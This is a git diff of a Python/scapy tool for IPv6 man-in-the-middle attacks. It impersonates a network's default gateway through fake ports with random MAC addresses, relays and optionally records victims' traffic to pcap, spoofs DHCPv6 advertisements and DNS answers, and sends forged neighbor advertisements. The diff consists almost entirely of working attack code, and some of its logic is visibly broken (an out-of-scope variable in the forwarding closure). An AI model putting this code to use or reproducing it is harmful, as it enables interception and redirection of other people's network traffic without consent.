@@ -1,7 +1,7 @@
 import click
 import time
 from scapy.all import *
-from scapy.all import IPv6,ICMPv6ND_NA,ICMPv6ND_RA,ICMPv6ND_NS,ICMPv6ND_Redirect,ICMPv6NDOptSrcLLAddr,UDP,DHCP6_Advertise,DHCPv6_am,Ether,ICMPv6NDOptRDNSS,RandMAC,DNS,DNSRR,DNSQR,LLMNRQuery, PcapWriter
+from scapy.all import IPv6,ICMPv6ND_NA,ICMPv6ND_RA,ICMPv6ND_NS,ICMPv6ND_Redirect,ICMPv6NDOptSrcLLAddr,UDP,DHCP6_Advertise,DHCPv6_am,Ether,ICMPv6NDOptRDNSS,RandMAC,DNS,DNSRR,DNSQR,LLMNRQuery,LLMNRResponse,DNS_am,PcapWriter
 from scapy.all import send,srp1,sniff,sendp,conf,get_if_hwaddr,read_routes6
 import os
 import subprocess
@@ -11,26 +11,12 @@ import dhcpAM
 import ipaddress
 import random
 import socket
-
-
-class Device:
-    def __init__(self, linklocal = "", globalip = "", macaddr = ""):
-        self.linklocal = linklocal
-        self.globalip = globalip
-        self.macaddr = macaddr
-
-class FakeGateway(Device):
-    def AddTarget(self,target):
-        self.targetDevice = target
-        self.pcap = PcapWriter(f"{self.linklocal}",append=True,sync=True)
-    def Write(self,packet):
-        self.pcap.write(packet)
-
+from clases import Device,vPort
 
 targets = []
 myDevice = Device()
 gatewayDev = Device()
-fakeGateways = []
+vPorts = []
 
 dhcpM = DHCPv6_am()
 
@@ -61,24 +47,26 @@ def get_target_mac(target,interface):
     r = srp1(IPv6(src=myDevice.linklocal,dst=target)/ICMPv6ND_NS(tgt=target),iface=interface,verbose=0)
     return r.getlayer(Ether).src
 
-def forwarder(fakegateway):
-    while True:
-        p = sniff(count=1,filter="ip6 && inbound")
+def forwarder(vPort):
+    target = vPort.targetDevice
+    sniff(filter="ip6 && inbound",prn=forward(target))
 
-        if p[0].getlayer(Ether).src == fakegateway.targetDevice.macaddr or p[0].getlayer(IPv6).src == fakegateway.targetDevice.linklocal:
-            p[0].getlayer(Ether).src = fakegateway.macaddr
-            p[0].getlayer(Ether).dst = gatewayDev.macaddr
-            p[0].getlayer(IPv6).src = fakegateway.linklocal
-            sendp(p,iface=conf.iface,verbose=0)
-            fakegateway.Write(p[0])
+def forward(target):
+    def forw(packet):
+        if packet.getlayer(Ether).src == target.macaddr or packet.getlayer(IPv6).src == target.linklocal or packet.getlayer(IPv6).src == target.globalip:
+            packet.getlayer(Ether).src = vPort.macaddr
+            packet.getlayer(Ether).dst = gatewayDev.macaddr
+            packet.getlayer(IPv6).src = vPort.linklocal
+            sendp(packet,iface=conf.iface,verbose=0)
+            vPort.Write(packet)
 
-        if p[0].getlayer(Ether).dst == fakegateway.macaddr or p[0].getlayer(IPv6).dst == fakegateway.linklocal:
-            p[0].getlayer(Ether).src = fakegateway.macaddr
-            p[0].getlayer(Ether).dst = gatewayDev.macaddr
-            p[0].getlayer(IPv6).dst = gatewayDev.linklocal
-            sendp(p,iface=conf.iface,verbose=0)
-            fakegateway.Write(p[0])
-
+        if packet.getlayer(Ether).dst == vPort.macaddr or packet.getlayer(IPv6).dst == vPort.linklocal:
+            packet.getlayer(Ether).src = vPort.macaddr
+            packet.getlayer(Ether).dst = gatewayDev.macaddr
+            packet.getlayer(IPv6).dst = gatewayDev.linklocal
+            sendp(packet,iface=conf.iface,verbose=0)
+            vPort.Write(packet)
+    return forw
 
 def DHCPadvertise(interface,targets = ['ff02::1']):
     while True:
@@ -106,8 +94,8 @@ def get_linklocal(interface):
     r = read_routes6()
     for line in r:
         print(line)
-        if line[3] == interface and regex.match("^fe80:.+",line[0]) and matchIPv6(line[0]):
-            print(str(line[4][0]))
+        if line[3] == interface and regex.match("^fe80:",line[0]) and matchIPv6(line[0]):
+            print(str(line[4]))
             return(str(line[4][0]))
 
 def get_global(interface):
@@ -160,10 +148,16 @@ def sendLLMNR(hostname):
     p = IPv6(dst="ff02::1:3")/UDP(dport=5355)/LLMNRQuery(id=trid,qd=DNSQR(qtype="PTR", qname=f"{getReverseDNS(hostname)}"))
     p.show()
     send(p)
-    r = sniff(filter = 'dst port 5355',count=1)
-    r[0].summary()
+    r = sniff(filter = 'dst port 5355',prn=getLLMNRResponse(trid))
+    print(r)
     if r[0].haslayer(LLMNRResponse) and r[0].getlayer(LLMNRResponse).id == trid:
         r[0].show()
+
+def getLLMNRResponse(trID):
+    def resp(packet):
+        if LLMNRResponse in packet and packet.getlayer(LLMNRResponse).id == trID:
+            return packet
+    return resp
 
 
 def getReverseDNS(targetIp):
@@ -247,7 +241,7 @@ def DNSanswer(interface,joker,dnsfile):
             if matchIPv6(jk):
                 joker = jk
 
-    dnsM = dnsAM.DNS_am(iface=interface,joker6=joker,match=processDndFile(dnsfile))
+    dnsM = DNS_am(iface=interface,joker6=joker,match=processDndFile(dnsfile))
 
     while True:
         p = sniff(filter=f"{dnsM.filter} && ip6 && inbound",count=1)
@@ -268,9 +262,11 @@ def mode_commands():
 @click.option("-t","--target", help="Target IPv6 address", default=None)
 @click.option("-gw", "--gateway", prompt="Enter the default gateway", help="The default gateway to impersonate")
 @click.option("-p","-pcap", is_flag=True, help="Write the traffic into a pcap file")
-def gateway(target,targetsfile,gateway,interface,pcap):
+def gateway(target,targetsfile,gateway,interface,p):
 
-    conf.iface = interface
+    #conf.iface = interface
+    if not conf.iface.is_valid():
+        raise SyntaxError("Interface is not valid")
     myDevice.linklocal = get_linklocal(interface=conf.iface)
     myDevice.globalip = get_global(interface)
     myDevice.macaddr = get_if_hwaddr(iff=interface)
@@ -281,24 +277,21 @@ def gateway(target,targetsfile,gateway,interface,pcap):
         processTargetsFile(targetsfile,interface)
     else:
         #TODO: Get global ip
-        d = Device(macaddr = get_target_mac(target,interface), linklocal = target,globalip="")
+        d = Device(macaddr = get_target_mac(target,conf.iface), linklocal = target,globalip="")
         targets.append(d)
 
     if not matchIPv6(target):
-        print(f"\"{target}\" is not a valid IPv6 address")
-        return
+        raise SyntaxError(f"\"{target}\" is not a valid IPv6 address")
 
     if not matchIPv6(gateway):
-        print(f"\"{gateway}\" is not a valid IPv6 address")
-        return
+        raise SyntaxError(f"\"{gateway}\" is not a valid IPv6 address")
 
     global gatewayDev
     gatewayDev.macaddr = get_target_mac(gateway,interface)
     gatewayDev.linklocal = gateway
 
     if not matchIPv6(myDevice.linklocal):
-        print(f"\"{myDevice.linklocal}\" is not a valid IPv6 address")
-        return
+        raise SyntaxError(f"\"{myDevice.linklocal}\" is not a valid IPv6 address")
 
     try:
         if subprocess.Popen(['sudo','cat','/proc/sys/net/ipv6/conf/all/forwarding'], stdout = subprocess.PIPE).communicate()[0] == b'1\n':
@@ -310,9 +303,9 @@ def gateway(target,targetsfile,gateway,interface,pcap):
 
     for t in targets:
         mac = get_random_mac()
-        d = FakeGateway(linklocal=linklocalFromMAC(mac),macaddr=mac)
+        d = vPort(linklocal=linklocalFromMAC(mac),macaddr=mac,write=p)
         d.AddTarget(t)
-        fakeGateways.append(d)
+        vPorts.append(d)
         threading.Thread(target=forwarder,daemon=True, args=(d)).start()
 
     input()
@@ -358,20 +351,34 @@ def dns(interface,targetsfile,dnsfile,joker):
     input()
     print("Quitting")
 
+def wrt(writer):
+    def wrtc(packet):
+        packet[0].summary()
+        writer.write(packet)
+    return wrtc
 
 @click.command()
 @click.option("-t","--target", help="Target IPv6 address", default=None)
 def helper(target):
-    conf.iface = "ens33"
-    conf.route6.routes = (r6 for r6 in conf.route6.routes if r6[3] == conf.iface)
-    r = sniff(iface='ens33', prn=lambda p: p.summary(), store=0)
-    r.summary()
-    sendLLMNR(target)
+    #print("AllRight")
+    #conf.iface = "ens33"
+    #conf.route6.routes = (r6 for r6 in conf.route6.routes if r6[3] == conf.iface)
+    #pcapw = PcapWriter(filename="pcaperino.pcap", append=True)
+    #sniff(prn=wrt(pcapw))
+    #print(r)
+    #sendLLMNR(target)
     #print(ipaddress.ip_network(f"{target}").broadcast_address)
     #print(socket.getnameinfo((target, 0), 0))
     #dev = Device(linklocal=target)
     #get_target_global(dev)
+    print(conf.iface)
+    p=IPv6(src="fe80::69",dst="fe80::96")/ICMPv6ND_NA(tgt="fe80::96",R=1,S=1,O=1)
+    print(p.show())
+    sendp(p,iface=conf.iface)
 
+
+def asd(pkt):
+    return 0
 
 mode_commands.add_command(helper)
 mode_commands.add_command(gateway)
